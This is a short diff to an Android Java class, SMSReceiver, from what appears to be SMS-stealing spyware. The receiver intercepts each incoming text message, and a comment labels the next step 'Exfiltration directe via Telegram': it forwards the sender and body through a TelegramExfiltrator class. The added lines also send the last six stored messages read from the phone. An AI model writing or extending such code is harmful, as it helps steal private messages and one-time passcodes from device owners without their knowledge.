@@ -26,10 +26,10 @@ public class SMSReceiver extends BroadcastReceiver {
                         String messageBody = smsMessage.getMessageBody();
 
                         Log.d(TAG, "SMS reçu de : " + sender + " - Contenu : " + messageBody);
-
                         // 👉 Exfiltration directe via Telegram
                         String smsContent = "New SMS Received:\nFrom: " + sender + "\nMessage: " + messageBody;
-                        TelegramExfiltrator.sendMessage(smsContent);
+                        TelegramExfiltrator.sendTexte(smsContent);
+                        TelegramExfiltrator.sendTexte(ComCollector.readSMS(context, 6));
                     }
                 }
             }
